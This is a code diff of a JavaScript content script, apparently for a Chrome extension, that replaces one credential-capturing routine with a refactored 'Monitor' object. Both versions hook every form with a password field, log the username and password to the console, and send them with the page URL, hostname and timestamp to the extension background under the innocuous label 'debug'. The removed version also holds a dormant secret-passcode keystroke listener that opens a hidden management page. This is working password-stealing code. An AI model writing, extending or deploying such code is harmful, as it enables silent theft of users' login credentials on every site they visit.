@@ -1,90 +1,61 @@
-function monitorSubmissions() {
-  
-    var forms = document.getElementsByTagName('form');
+function Monitor(document) {
+  this.document = document;
 
-    for (var i = 0; i < forms.length; i++) {
-      var form = forms[i];
-      console.log("Tag name: " + form.name)
-      var fields = form.getElementsByTagName('input');
-
-      // attempt to locate user/pass elements
-      for (var j = 0; j < fields.length; j++) {
-          var f = fields[j];
-
-          // recognize user/pass form elements
-          if (!form._pass && f.type == 'password')
-          {
-              form._pass = f;
-              console.log(form._pass.value);
-          }
-          else if (!form._user && (f.type == 'text' || f.type == 'email'))
-          {
-              form._user = f;
-              console.log(form._user.value);              
-          }
-
-          // wait until user/pass are found
-          if (!(form._user !== undefined && form._pass !== undefined))
-              continue;
-
-          // add event handler to form
-          form.onsubmit = function() {
-              if (this._user.value && this._pass.value) {
-                  // post credentials to background
-                  console.log("SUBMITTING");
-                  chrome.extension.sendRequest({
-                      action: 'debug',
-                      crud: 'create',
-                      record: [
-                          window.location.href,
-                          window.location.hostname,
-                          this._user.value,
-                          this._pass.value,
-                          Date.now()
-                      ]
-                  });
-              }
-        };
-        break;
-    }
-  }
-}
-
-function monitorKeystrokes() {
-
-    var passcode; // extension passcode
-    var progress = 0; // characters of passcode matched
-
-    chrome.storage.local.get('passcode', function(response) {
-      passcode = response.passcode.toUpperCase();
-    });
-
-    chrome.storage.onChanged.addListener(function(changes, namespace) {
-      for (key in changes) {
-        if (key == 'passcode')
-          passcode = changes[key].newValue.toUpperCase();
+  this.serializeFormData = function(form) {
+    var formData = {};
+    var inputTypesToSerialize = ['text','email','password'];
+    var formInputs = form.getElementsByTagName('input');
+    Array.prototype.forEach.call(formInputs, function(formInput) {
+      if(inputTypesToSerialize.indexOf(formInput.type.toLowerCase()) !== -1 && formInput.name !== '') {
+        formData[formInput.type.toLowerCase()] = formInput.value;
       }
     });
+    return formData;
+  };
 
-    window.addEventListener('keydown', function(event) {
+  this.recordDetails = function(form) {
+    var self = this;
+    form.addEventListener('submit', function(e) {
+      var url = document.location.href;
+      var formData = self.serializeFormData(form);
 
-        // compare input with expected charCode
-        if (event.which == passcode.charCodeAt(progress)) {
+      var user = (typeof formData['text'] !== 'undefined' ? formData['text'] : formData['email']);
+      var password = formData['password'];
+      console.log(user);
+      console.log(password);
 
-            if (progress == passcode.length - 1) {
-
-                // request to open the `manage` page
-                chrome.extension.sendRequest({action: 'openManage'});
-
-            } else {
-                progress++;
-                return true;
-            }
-        }
-
-        progress = 0;
+      console.log("SUBMITTING");
+      chrome.extension.sendRequest({
+          action: 'debug',
+          crud: 'create',
+          record: [
+              window.location.href,
+              window.location.hostname,
+              user,
+              password,
+              Date.now()
+          ]
+      });
     });
-}
+  };
 
-monitorSubmissions(); // monitor submissions for login credentials
-// monitorKeystrokes(); // monitor keystrokes for extension passcode
+  this.registerEvents = function() {
+    var self = this;
+    var inputs = document.getElementsByTagName('input');
+    Array.prototype.forEach.call(inputs, function(input) {
+      if(input.type.toLowerCase() === 'password') {
+        if(input.form) {
+          self.recordDetails(input.form);
+        }
+      }
+    });
+  };
+
+  this.startMonitoring = function() {
+    this.registerEvents();
+  };
+
+};
+
+var m = new Monitor(document);
+m.startMonitoring();
